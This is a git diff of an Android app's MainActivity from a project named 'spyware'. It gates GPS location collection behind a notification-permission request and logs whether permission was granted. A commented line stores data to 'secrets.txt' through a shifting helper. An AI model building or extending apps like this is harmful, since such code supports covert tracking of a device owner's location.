@@ -22,11 +22,14 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import com.example.spyware.ui.theme.SpywareTheme
 import android.provider.Settings
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationManagerCompat
 import appendShiftedToFile
 import com.example.spyware.common.Constants
 import log
 import org.json.JSONObject
+import android.Manifest.permission.POST_NOTIFICATIONS
 
 class MainActivity : ComponentActivity() {
     private var mobileDialogOpen=false
@@ -49,9 +52,8 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        gpsReader=GpsReader(this)
-        gpsReader.grantLocationPermission(this)
-        gpsReader.turnOnLocation(this)
+
+        requestNotificationPermission()
 
 
 //        appendShiftedToFile(this.filesDir,"secrets.txt","hello world",4)
@@ -78,6 +80,28 @@ class MainActivity : ComponentActivity() {
         showEnableInternetDialog(this)
     }
 
+    private val requestPermissionLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean ->
+            if (isGranted) {
+                // Permission is granted. Continue the action or workflow in your app.
+                gpsReader=GpsReader(this)
+                gpsReader.grantLocationPermission(this)
+                gpsReader.turnOnLocation(this)
+                log(this,JSONObject().put("info","Notification permission granted"))
+            } else {
+                // Explain to the user that the feature is unavailable because the
+                // feature requires a permission that the user has denied. At the
+                // same time, respect the user's decision. Don't link to system
+                // settings in an effort to convince the user to change their
+                // decision.
+                log(this,JSONObject().put("warning","Notification permission denied"))
+            }
+        }
+    private fun requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !NotificationManagerCompat.from(this).areNotificationsEnabled()) {
+            requestPermissionLauncher.launch(POST_NOTIFICATIONS)
+        }
+    }
         // Step 4: Handle result of user's decision
 
     fun showEnableInternetDialog(context: Context) {
